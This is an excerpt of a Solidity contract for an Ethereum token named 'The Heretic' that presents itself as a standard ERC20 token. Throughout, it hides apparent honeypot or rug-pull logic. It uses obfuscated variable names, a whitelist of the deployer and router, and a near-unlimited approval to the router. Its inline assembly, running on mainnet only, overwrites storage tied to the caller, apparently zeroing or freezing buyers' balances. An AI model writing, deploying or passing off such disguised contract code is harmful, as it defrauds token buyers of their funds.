...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addHeretic;
    uint256 private arteMaster = block.number*2;

    mapping (address => bool) private _firstRocket; 
    mapping (address => bool) private _secondExplosion;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private goodEgg;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private birdFlap;
    address public pair;
    ...
    bool private trading; uint256 private curveNow = 1; bool private cawAttack;
    uint256 private _decimals; uint256 private cowUp;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addHeretic.push(_router); addHeretic.push(msgSender_); addHeretic.push(pair);
        for (uint256 q=0; q < 3;) {_firstRocket[addHeretic[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xd4857ac31ecddfa124cd1e4d2ac57196275338bba4f69aad4396aa291d83ff09
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xd8bdd41a6832fc5b08a4e059ec0d30c60344bff8fb5794bc313ec16498767d29,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; arteMaster = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addHeretic[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployHeretic(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addHeretic[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployHeretic(creator, initialSupply);
    }
}

contract TheHeretic is ERC20Token {
    constructor() ERC20Token("The Heretic", "HERETIC", msg.sender, 666666666 * 10 ** 18) {
    }
}